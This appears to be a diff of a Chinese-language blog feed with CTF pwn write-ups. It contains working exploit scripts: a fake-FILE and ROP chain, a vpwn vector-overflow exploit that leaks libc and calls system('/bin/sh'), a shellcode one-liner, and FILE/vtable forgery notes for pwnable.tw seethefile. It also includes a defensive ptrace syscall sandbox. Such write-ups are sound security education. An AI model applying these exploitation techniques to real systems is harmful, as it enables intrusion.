+    <span class="nb">buffer</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="o">-</span> <span class="mh">0x220</span>
+    <span class="n">array_base</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x20</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'buffer: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'array_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">array_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="n">rop_chain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="mh">0xdeadbeef</span><span class="p">,</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">int1</span><span class="p">,</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="p">,</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">)),</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span>
+        <span class="mh">0x0</span><span class="p">,</span>
+    <span class="p">])</span>
+
+    <span class="n">null_ptr</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="mh">0x28</span>
+    <span class="n">fs_addr</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop_chain</span><span class="p">)</span> <span class="c1"># pos of the fake FS
+</span>
+    <span class="n">fs</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="mh">0x00</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># flags
+</span>        <span class="mh">0x08</span><span class="p">:</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rbp</span><span class="p">,</span> <span class="c1"># _IO_read_ptr
+</span>        <span class="mh">0x10</span><span class="p">:</span> <span class="nb">buffer</span><span class="p">,</span> <span class="c1"># _IO_read_end
+</span>        <span class="mh">0x18</span><span class="p">:</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">leave_ret</span><span class="p">,</span> <span class="c1"># _IO_read_base
+</span>        <span class="mh">0x88</span><span class="p">:</span> <span class="n">null_ptr</span><span class="p">,</span> <span class="c1"># _lock
+</span>        <span class="mh">0xa0</span><span class="p">:</span> <span class="n">fs_addr</span> <span class="o">+</span> <span class="mh">0xf0</span> <span class="o">-</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="c1"># _wide_data
+</span>        <span class="mh">0xa8</span><span class="p">:</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">leave_ret</span><span class="p">,</span>
+        <span class="mh">0xd8</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'_IO_wfile_jumps'</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">-</span> <span class="mh">0x38</span><span class="p">,</span> <span class="c1"># vtable
+</span>        <span class="mh">0xf0</span><span class="p">:</span> <span class="n">fs_addr</span> <span class="o">+</span> <span class="mh">0xa8</span> <span class="o">-</span> <span class="mh">0x68</span><span class="p">,</span>
+    <span class="p">})</span>
+
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'one &gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'recv:'</span><span class="p">,</span> <span class="n">rop_chain</span> <span class="o">+</span> <span class="n">fs</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'which one?'</span><span class="p">,</span> <span class="nb">str</span><span class="p">((</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'stdout'</span><span class="p">]</span><span class="o">-</span><span class="n">array_base</span><span class="p">)</span><span class="o">//</span><span class="mi">8</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'value?'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">fs_addr</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h2 id="vpwn">vpwn</h2>
+
+<p>题目实现了一个简易的 vector 结构体，类似：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">vec</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span>
+	<span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>通过菜单提供了以下几个功能：</p>
+
+<ul>
+  <li>Edit：编辑某个已有元素</li>
+  <li>Pop：弹出一个元素</li>
+  <li>Push：压入一个元素（存在漏洞：没有对总长度作限制）</li>
+  <li>Print：打印所有元素</li>
+</ul>
+
+<p>在 6 次 Push 后，第七和第八次 push 即可覆盖 length，而后就可以通过 print 泄露栈上的各种数据，并用 edit 编辑返回地址，打 ROP。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'index'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'value: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">push</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'value'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">pop</span><span class="p">():</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">printv</span><span class="p">():</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+        <span class="n">push</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+    <span class="n">push</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+    <span class="n">printv</span><span class="p">()</span>
+
+    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'contents: '</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">18</span><span class="p">):</span>
+        <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)</span>
+
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span> <span class="o">+</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">libc_start_main_return</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="c1">#one_gadget = libc_base + 0xebd43
+</span>    <span class="c1">#info(f'one_gadget: {hex(one_gadget)}')
+</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000029139</span>
+    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000002a3e5</span>
+    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+    <span class="n">edit</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span> <span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">19</span><span class="p">,</span> <span class="n">ret</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">21</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="n">binsh</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">23</span><span class="p">,</span> <span class="n">binsh</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">25</span><span class="p">,</span> <span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h2 id="heavens-door">Heaven’s door</h2>
+
+<p>神秘。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+	<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"puchid:"</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">()))</span>
+</code></pre></div></div>
+
+<h2 id="一个相对完善的-ptrace-sandbox">一个相对完善的 ptrace sandbox</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ * pt.c
+ * Copyright (C) 2025 cameudis &lt;cameudis@gmail.com&gt;
+ *
+ * Distributed under terms of the MIT license.
+ */</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/ptrace.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/user.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">break_syscall</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">pid</span><span class="p">,</span> <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="o">*</span><span class="n">regs</span><span class="p">){</span>
+  <span class="kt">int</span> <span class="n">stat_loc</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="n">__WALL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"waitpid error"</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="n">SIGTRAP</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">goto</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGSEGV</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">goto</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">WIFEXITED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">goto</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="nl">ret:</span>
+  <span class="k">return</span> <span class="n">stat_loc</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+  <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">stat_loc</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// child</span>
+
+    <span class="c1">// waiting for parent to attach...</span>
+    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
+    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">mypid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+    <span class="n">kill</span><span class="p">(</span><span class="n">mypid</span><span class="p">,</span> <span class="n">SIGSTOP</span><span class="p">);</span>
+
+    <span class="c1">// do something...</span>
+    <span class="n">asm</span><span class="p">(</span><span class="s">"int3"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"echo 'Hello, World!'"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// parent</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"waitpid error1"</span><span class="p">);</span>
+    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETOPTIONS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PTRACE_O_TRACESYSGOOD</span><span class="p">);</span>
+
+    <span class="c1">// monitor syscall</span>
+    <span class="k">do</span> <span class="p">{</span>
+      <span class="c1">// wait child to stop at syscall</span>
+      <span class="n">stat_loc</span> <span class="o">=</span> <span class="n">break_syscall</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+
+      <span class="c1">// exit if child die</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">WIFEXITED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">||</span> <span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGSEGV</span><span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+
+      <span class="c1">// perform check</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"GETREGS error"</span><span class="p">);</span>
+      <span class="kt">size_t</span> <span class="n">syscall_num</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">orig_rax</span><span class="p">;</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Syscall number: %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">syscall_num</span><span class="p">);</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_read</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_write</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_fstat</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_exit</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_clock_nanosleep</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_exit_group</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Bad Syscall"</span><span class="p">);</span>
+        <span class="n">regs</span><span class="p">.</span><span class="n">orig_rax</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"SETREGS error"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+      <span class="c1">// wait for syscall ret</span>
+      <span class="n">stat_loc</span> <span class="o">=</span> <span class="n">break_syscall</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">WIFEXITED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">||</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">!=</span> <span class="n">SIGSEGV</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>]]></content><author><name></name></author><category term="pwn" /><summary type="html"><![CDATA[babytrace]]></summary></entry><entry><title type="html">GhostWrite #2: 漏洞利用代码分析</title><link href="https://www.cameudis.com/2025/01/06/GhostWrite-2.html" rel="alternate" type="text/html" title="GhostWrite #2: 漏洞利用代码分析" /><published>2025-01-06T00:00:00+08:00</published><updated>2025-01-06T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/01/06/GhostWrite-2</id><content type="html" xml:base="https://www.cameudis.com/2025/01/06/GhostWrite-2.html"><![CDATA[<h2 id="qemu-patch">QEMU Patch</h2>
 
 <p>为了复现 GhostWrite 环境，我们需要在 qemu 中添加 patch 来进行软件层面模拟。</p>
 
@@ -2279,287 +2781,4 @@ timervec:
 <p><strong>函数数组和数组下标都是非常危险的东西——前者容易被劫持，后者容易超越边界。</strong>
 本漏洞修补十分简单，只需要加上一个检查就可以了。</p>
 
-<p>从这道题目的利用中，我们可以发现：<strong>任意调用与 gadget 结合或许可以轻松达成栈迁移，允许我们进行 ROP 攻击。</strong></p>]]></content><author><name></name></author><category term="pwnable.tw" /><summary type="html"><![CDATA[本题 neta 了星界边境，实现了一个简单的二维探索游戏。]]></summary></entry><entry><title type="html">pwnable.tw seethefile</title><link href="https://www.cameudis.com/2023/05/07/pwnable-tw-seethefile-writeup.html" rel="alternate" type="text/html" title="pwnable.tw seethefile" /><published>2023-05-07T20:44:10+08:00</published><updated>2023-05-07T20:44:10+08:00</updated><id>https://www.cameudis.com/2023/05/07/pwnable-tw-seethefile-writeup</id><content type="html" xml:base="https://www.cameudis.com/2023/05/07/pwnable-tw-seethefile-writeup.html"><![CDATA[<p>借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。</p>
-
-<p>本题相关：FILE伪造、vtable伪造、fclose</p>
-
-<hr />
-
-<h2 id="漏洞分析">漏洞分析</h2>
-
-<p>保护情况：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-</code></pre></div></div>
-
-<p>程序大致是一个menu，可以选择以下几种功能：</p>
-<ol>
-  <li>open：指定文件名打开文件，将FILE*保存到bss段的fp（不允许文件名中含有flag子字符串）</li>
-  <li>read：从fp中读取0x18F个字节，并保存到bss段的magic_buffer中</li>
-  <li>write：将magic_buffer中的内容打印到屏幕上（不允许内容中含有flag、}）</li>
-  <li>close：关闭fp</li>
-  <li>exit：往bss读取一串字符串（name）后，尝试fclose(fp)并退出</li>
-</ol>
-
-<p>程序漏洞点有两个：</p>
-<ol>
-  <li>main函数读取选项时，使用了 <code class="language-plaintext highlighter-rouge">scanf("%s", buf)</code>，其中buf是一个栈变量。</li>
-  <li>main函数在exit读取name时，也使用了 <code class="language-plaintext highlighter-rouge">scanf("%s", name)</code>，其中name在bss段上，且fp在它的后面。</li>
-</ol>
-
-<p>由于main函数没有ret，只有exit，因此我们没办法使用第一个漏洞来劫持程序控制流。
-但第二个漏洞非常有用，我们可以通过溢出name来覆写fp指针，通过伪造FILE结构体和vtable的方式，我们可以让fclose调用某个给定的地址的代码，从而劫持程序控制流。</p>
-
-<p>此外，还有一个不太算漏洞的疏忽，就是我们可以通过读取 <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> 来得到程序各个段的地址。虽然read一次只能读取0x18F个字节，但是由于文件流在下一次读取时会接着读，所以我们是可以获取完整的文件内容的。</p>
-
-<h2 id="file-结构体分析">FILE 结构体分析</h2>
-
-<p>在glibc中，有三个初始文件流直接位于glibc的数据段，是stdin、stdout和stderr。当用户使用fopen打开新的文件时，FILE结构体会使用malloc分配到程序的堆上。</p>
-
-<p>FILE结构体的定义位于 <code class="language-plaintext highlighter-rouge">libio/libio.h</code>，在2.23-0ubuntu3版本中如下：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
-  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
-<span class="cp">#define _IO_file_flags _flags
-</span>
-  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
-  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>
-  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
